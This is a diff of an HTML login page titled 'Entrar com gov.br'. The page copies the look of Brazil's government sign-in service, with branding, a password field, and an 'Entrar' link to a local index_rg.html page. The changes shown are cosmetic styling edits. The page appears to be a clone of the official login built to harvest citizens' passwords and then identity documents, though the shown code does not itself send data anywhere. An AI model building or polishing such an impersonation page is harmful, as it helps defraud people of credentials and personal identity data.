@@ -5,12 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>Entrar com gov.br</title>
 
-  <!-- Fontes -->
+  <!-- Fonte Roboto -->
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
-  <!-- Ícones -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
+  <!-- Ícone da aba -->
   <link rel="icon" href="static/govbr.png" type="image/png" />
 
   <style>
@@ -26,7 +24,7 @@
     }
 
     .topbar {
-      background-color:#001F5C;
+      background-color: #001F5C;
       color: #fff;
       padding: 16px;
       display: flex;
@@ -54,7 +52,6 @@
     .govbr-logo {
       font-size: 35px;
       font-weight: bold;
-      font-family: 'Roboto', Arial, sans-serif;
       margin: 5px 0;
       text-align: left;
     }
@@ -80,8 +77,9 @@
     h6 {
       font-weight: normal;
       font-size: 12px;
-      margin: 0;
-      display: inline;
+      margin: 0 0 8px 0;
+      display: block;
+      color: #555;
     }
 
     input {
@@ -100,7 +98,6 @@
       font-size: 16px;
       background: #1351B4;
       color: #fff;
-      border: none;
       border-radius: 6px;
       cursor: pointer;
       text-align: center;
@@ -165,9 +162,8 @@
 
     <label for="senha">📇 Sua senha</label>
     <h6>Digite sua senha para acessar sua conta gov.br</h6>
-    <br><br>
     <label for="senha">Senha</label>
-    <input type="password" id="senha" placeholder="Digite sua senha" />
+    <input type="password" id="senha" placeholder="Digite sua senha" autocomplete="current-password" />
 
     <!-- Redirecionamento seguro para WebView -->
     <a href="index_rg.html" class="btn">Entrar</a>
